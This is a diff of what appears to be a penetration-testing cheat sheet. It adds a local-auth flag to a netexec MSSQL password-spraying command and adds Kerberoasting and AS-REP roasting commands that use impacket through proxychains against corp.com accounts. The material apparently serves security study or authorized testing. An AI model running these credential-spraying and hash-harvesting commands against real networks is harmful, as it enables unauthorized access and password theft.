@@ -32,10 +32,24 @@
   ```
 * <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec wmi ips.txt -u users.txt -p passwords.txt 
   </strong></code></pre>
-* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec mssql ips.txt -u users.txt -p passwords.txt 
+* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec mssql ips.txt -u users.txt -p passwords.txt -local-auth
   </strong></code></pre>
 
 
+
+## Harvested Domain Credential
+
+### Kerberoast
+
+* ```shell-session
+  $ proxychains impacket-GetUserSPNs -request -dc-ip 10.10.113.146 corp.com/web_svc
+  ```
+
+### ASREP Roast
+
+* ```shell-session
+  $ proxychains impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+  ```
 
 
 
